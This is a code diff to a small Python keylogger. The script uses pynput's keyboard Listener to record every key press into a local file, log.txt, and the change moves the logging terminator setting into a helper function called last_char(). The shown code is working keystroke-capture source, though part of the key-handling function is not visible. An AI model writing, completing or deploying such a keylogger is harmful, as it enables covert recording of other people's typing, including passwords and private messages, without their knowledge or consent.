@@ -2,8 +2,10 @@ from pynput.keyboard import Listener
 import logging
 
 logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(message)s')
-# logging.info('')
-logging.StreamHandler.terminator = ''
+
+
+def last_char():
+    logging.StreamHandler.terminator = ''
 
 
 def on_press(key):
@@ -12,8 +14,10 @@ def on_press(key):
     else:
         logging.info('')
 
-    logging.StreamHandler.terminator = ''
+    last_char()
 
+
+last_char()
 
 with Listener(on_press=on_press) as listener:
     listener.join()
